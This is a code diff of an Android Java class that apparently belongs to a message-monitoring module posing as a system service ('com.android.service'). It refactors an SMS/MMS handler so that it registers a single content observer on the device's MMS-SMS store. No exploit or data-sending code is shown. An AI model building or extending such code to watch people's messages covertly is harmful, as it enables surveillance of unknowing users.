@@ -1,4 +1,4 @@
-package com.android.service.interfaces;
+package com.android.service.module.message;
 
 import android.content.ContentResolver;
 import android.database.ContentObserver;
@@ -10,25 +10,16 @@ import android.os.Message;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.interfaces.MmsObserver;
+import com.android.service.interfaces.SmsObserver;
 import com.android.service.util.Check;
 
-public class SmsMmsHandler extends Thread {
+public class MmsHandler extends Thread {
 	private static final String TAG = "SmsHandler"; //$NON-NLS-1$
 
 	private Handler handler;
-	private ContentObserver smsObserver;
-	private ContentObserver mmsObserver;
-	boolean smsEnabled;
-	boolean mmsEnabled;
 
-	public SmsMmsHandler(boolean smsEnabled, boolean mmsEnabled) {
-		if (Cfg.DEBUG) {
-			Check.requires(smsEnabled || mmsEnabled, " (SmsHandler) Requires failed, no sms neither mms enabled");
-		}
-
-		this.smsEnabled = smsEnabled;
-		this.mmsEnabled = mmsEnabled;
-	}
+	private ContentObserver observer;
 
 	@Override
 	public void run() {
@@ -59,15 +50,8 @@ public class SmsMmsHandler extends Thread {
 		// content://sms
 		// Messages.getString("25.0") : "content://sms"
 
-		if (smsEnabled) {
-			smsObserver = new SmsObserver(handler);
-			cr.registerContentObserver(Uri.parse("content://sms/outbox"), true, smsObserver); //$NON-NLS-1$
-		}
-
-		if (mmsEnabled) {
-			mmsObserver = new MmsObserver(handler);
-			cr.registerContentObserver(Uri.parse("content://mms-sms"), true, mmsObserver); //$NON-NLS-1$
-		}
+		observer = new MmsObserver(handler);
+		cr.registerContentObserver(Uri.parse("content://mms-sms"), false, observer); //$NON-NLS-1$
 
 		Looper.loop();
 	}
